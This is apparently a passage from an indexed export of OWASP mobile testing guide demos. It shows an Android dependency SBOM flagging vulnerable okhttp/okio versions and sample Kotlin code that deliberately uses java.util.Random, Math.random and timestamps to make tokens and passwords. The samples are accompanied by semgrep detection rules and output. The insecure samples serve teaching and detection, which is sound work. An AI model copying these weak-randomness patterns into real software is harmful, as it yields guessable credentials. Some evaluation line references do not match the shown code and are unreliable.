\"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material/material-ripple-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.ui/ui-tooling-data-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-graphics@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-junit4@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test-manifest@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-test@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling-preview@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-tooling@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.animation/animation-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.animation/animation-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-geometry@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.animation/animation-core-android@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.animation/animation-core-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-unit@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlinx/kotlinx-coroutines-core@1.7.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n                \"pkg:maven/androidx.activity/activity-ktx@1.8.2?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.profileinstaller/profileinstaller@1.3.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n                \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation-experimental@1.3.0?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation-experimental@1.4.0?type=jar\",\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.concurrent/concurrent-futures@1.1.0?type=jar\",\n                \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n                \"pkg:maven/androidx.interpolator/interpolator@1.0.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.versionedparcelable/versionedparcelable@1.1.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.versionedparcelable/versionedparcelable@1.1.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection-jvm@1.4.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.collection/collection-jvm@1.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection-ktx@1.4.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-ktx@1.8.2?type=jar\",\n                \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime-saveable@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.activity/activity-ktx@1.8.2?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.activity/activity-compose@1.8.2?type=jar\",\n                \"pkg:maven/androidx.activity/activity@1.8.2?type=jar\",\n                \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate-ktx@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.9.10?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.squareup.okhttp3/okhttp@4.8.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.squareup.okio/okio@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.squareup.okio/okio@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/com.squareup.okio/okio-metadata@2.7.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.startup/startup-runtime@1.1.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.collection/collection-ktx@1.4.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.interpolator/interpolator@1.0.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.arch.core/core-runtime@2.2.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.arch.core/core-common@2.2.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.profileinstaller/profileinstaller@1.3.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.concurrent/concurrent-futures@1.1.0?type=jar\",\n                \"pkg:maven/androidx.startup/startup-runtime@1.1.1?type=jar\",\n                \"pkg:maven/com.google.guava/listenablefuture@1.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.startup/startup-runtime@1.1.1?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.tracing/tracing@1.0.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.autofill/autofill@1.0.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.emoji2/emoji2@1.3.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.collection/collection@1.4.0?type=jar\",\n                \"pkg:maven/androidx.core/core@1.12.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.startup/startup-runtime@1.1.1?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.customview/customview-poolingcontainer@1.0.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.core/core-ktx@1.12.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.lifecycle/lifecycle-common-java8@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-common@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-livedata-core@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-process@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-ktx@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel-savedstate@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material/material@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.compose.material/material-android@1.6.5?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.material/material-android@1.6.5?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/androidx.annotation/annotation@1.7.0?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.animation/animation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation-layout@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.foundation/foundation@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-icons-core@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.material/material-ripple@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.runtime/runtime@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-text@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui-util@1.6.5?type=jar\",\n                \"pkg:maven/androidx.compose.ui/ui@1.6.5?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-runtime@2.7.0?type=jar\",\n                \"pkg:maven/androidx.lifecycle/lifecycle-viewmodel@2.7.0?type=jar\",\n                \"pkg:maven/androidx.savedstate/savedstate@1.2.1?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.annotation/annotation-experimental@1.3.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/com.squareup.okio/okio-metadata@2.7.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib-common@1.9.10?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/androidx.compose.compiler/compiler@1.5.1?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-impl@1.9.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-api@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-build-tools-api@1.9.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-compiler-embeddable@1.9.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.intellij.deps/trove4j@1.0.20200330?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-daemon-embeddable@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.6.10?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-script-runtime@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\"\n            ]\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-script-runtime@1.9.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-reflect@1.6.10?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-daemon-embeddable@1.9.0?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.intellij.deps/trove4j@1.0.20200330?type=jar\",\n            \"dependsOn\": []\n        },\n        {\n            \"ref\": \"pkg:maven/org.jetbrains.kotlin/kotlin-klib-commonizer-embeddable@1.9.0?type=jar\",\n            \"dependsOn\": [\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-compiler-embeddable@1.9.0?type=jar\",\n                \"pkg:maven/org.jetbrains.kotlin/kotlin-stdlib@1.9.0?type=jar\"\n            ]\n        }\n    ]\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0051/MASTG-DEMO-0051/#evaluation","title":"Evaluation","text":"<p>Review each of the reported instances. The dependency <code>okhttp</code> has 2 known vulnerabilities and <code>okio</code> has 1 known vulnerability and they should all be updated to the latest version.</p> output.json<pre><code>[\n    {\n        \"group\": \"com.squareup.okhttp3\",\n        \"name\": \"okhttp\",\n        \"version\": \"4.8.0\",\n        \"scope\": \"optional\",\n        \"purl\": \"pkg:maven/com.squareup.okhttp3/okhttp@4.8.0?type=jar\",\n        \"type\": \"library\",\n        \"bom-ref\": \"pkg:maven/com.squareup.okhttp3/okhttp@4.8.0?type=jar\",\n        \"properties\": [\n            {\n                \"name\": \"GradleProfileName\",\n                \"value\": \"debugAndroidTestCompileClasspath\"\n            }\n        ]\n    },\n    {\n        \"group\": \"com.squareup.okio\",\n        \"name\": \"okio\",\n        \"version\": \"2.7.0\",\n        \"scope\": \"optional\",\n        \"purl\": \"pkg:maven/com.squareup.okio/okio@2.7.0?type=jar\",\n        \"type\": \"library\",\n        \"bom-ref\": \"pkg:maven/com.squareup.okio/okio@2.7.0?type=jar\",\n        \"properties\": [\n            {\n                \"name\": \"GradleProfileName\",\n                \"value\": \"debugAndroidTestCompileClasspath\"\n            }\n        ]\n    }\n]\n</code></pre>","tags":["android","demo","MASTG-TEST-0272"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0007/MASTG-DEMO-0007/","title":"MASTG-DEMO-0007: Common Uses of Insecure Random APIs","text":"<p>  Download MASTG-DEMO-0007 APK   Open MASTG-DEMO-0007 Folder  Build MASTG-DEMO-0007 APK</p>","tags":["android","demo","MASTG-TEST-0204"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0007/MASTG-DEMO-0007/#sample","title":"Sample","text":"MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.util.Random\nimport java.lang.*\nimport java.security.SecureRandom\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n\n        // FAIL: [android-insecure-random-use] The app insecurely uses random numbers for generating authentication tokens.\n        val random1 = Random().nextDouble()\n\n        // FAIL: [android-insecure-random-use] The title of the function indicates that it generates a random number, but it is unclear how it is actually used in the rest of the app. Review any calls to this function to ensure that the random number is not used in a security-relevant context.\n        val random2 = 1 + Math.random()\n\n        val length = 16\n        val characters = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\n        val random = Random()\n        val password = StringBuilder(length)\n\n        for (i in 0 until length) {\n            // FAIL: [android-insecure-random-use] The app insecurely uses random numbers for generating passwords, which is a security-relevant context.\n            password.append(characters[random.nextInt(characters.length)])\n        }\n\n        val random3 = password.toString()\n\n        // PASS: [android-insecure-random-use] The app uses a secure random number generator.\n\n        val random4 = SecureRandom().nextInt(21)\n\n        return \"Generated random numbers:\\n$random1 \\n$random2 \\n$random3 \\n$random4\"\n    }\n\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport java.security.SecureRandom;\nimport java.util.Random;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        double random1 = new Random().nextDouble();\n        double random2 = 1 + Math.random();\n        Random random = new Random();\n        StringBuilder password = new StringBuilder(16);\n        for (int i = 0; i &lt; 16; i++) {\n            password.append(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".charAt(random.nextInt(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".length())));\n        }\n        String random3 = password.toString();\n        Intrinsics.checkNotNullExpressionValue(random3, \"toString(...)\");\n        int random4 = new SecureRandom().nextInt(21);\n        return \"Generated random numbers:\\n\" + random1 + \" \\n\" + random2 + \" \\n\" + random3 + \" \\n\" + random4;\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0204"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0007/MASTG-DEMO-0007/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-random-apis-insufficient-entropy.yml<pre><code>rules:\n  - id: mastg-android-random-apis-insufficient-entropy\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for common patterns including classes and methods.\n      original_source: https://github.com/mindedsecurity/semgrep-rules-android-security/blob/main/rules/crypto/mstg-crypto-6.yaml\n    message: \"[MASVS-CRYPTO-1] The application makes use of random number generators with insufficient entropy.\"\n\n    pattern-either:\n        - patterns:\n            - pattern-inside: $M(...){ ... }\n            - pattern-either:\n                - pattern: Math.random(...)\n                - pattern: (java.util.Random $X).$Y(...)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-random-apis-insufficient-entropy.yml ./MastgTest_reversed.java --text &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0204"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0007/MASTG-DEMO-0007/#observation","title":"Observation","text":"<p>The rule has identified five instances in the code file where an insecure random number generator is used. The specified line numbers can be located in the original code for further investigation and remediation.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 3 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-random-apis-insufficient-entropy\n          [MASVS-CRYPTO-1] The application makes use of random number generators with insufficient entropy.\n\n           22\u2506 double random1 = new Random().nextDouble();\n            \u22ee\u2506----------------------------------------\n           23\u2506 double random2 = 1 + Math.random();\n            \u22ee\u2506----------------------------------------\n           27\u2506 password.append(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".charAt(ran\n               dom.nextInt(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".length())));  \n</code></pre>","tags":["android","demo","MASTG-TEST-0204"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0007/MASTG-DEMO-0007/#evaluation","title":"Evaluation","text":"<p>Review each of the reported instances.</p> <ul> <li>Line 12 seems to be used to generate random numbers for security purposes, in this case for generating authentication tokens.</li> <li>Line 17 is part of the function <code>get_random</code>. Review any calls to this function to ensure that the random number is not used in a security-relevant context.</li> <li>Line 27 is part of the password generation function which is a security-critical operation.</li> </ul> <p>Note that line 37 did not trigger the rule because the random number is generated using <code>SecureRandom</code> which is a secure random number generator.</p>","tags":["android","demo","MASTG-TEST-0204"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0008/MASTG-DEMO-0008/","title":"MASTG-DEMO-0008: Uses of Non-random Sources","text":"<p>  Download MASTG-DEMO-0008 APK   Open MASTG-DEMO-0008 Folder  Build MASTG-DEMO-0008 APK</p>","tags":["android","demo","MASTG-TEST-0205"]},{"location":"MASTG/demos/android/MASVS-CRYPTO/MASTG-DEMO-0008/MASTG-DEMO-0008/#sample","title":"Sample","text":"MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.util.Calendar\nimport java.util.Date\n\nclass MastgTest (private val context: Context){\n\n    fun mastgTest(): String {\n        // SUMMARY: This sample demonstrates different ways of creating non-random tokens in Java.\n\n        // FAIL: [android-insecure-random-use] The app uses Date().time for generating authentication tokens.\n        val random1 = Date().time.toInt()\n\n        val c = Calendar.getInstance()\n        // FAIL: [android-insecure-random-use] The app uses Calendar.getInstance().timeInMillis for generating authentication tokens.\n        val random2 = c.get(Calendar.MILLISECOND)\n\n        return \"Generated random numbers:\\n$random1 \\n$random2\"\n    }\n\n}\n</code></pre> 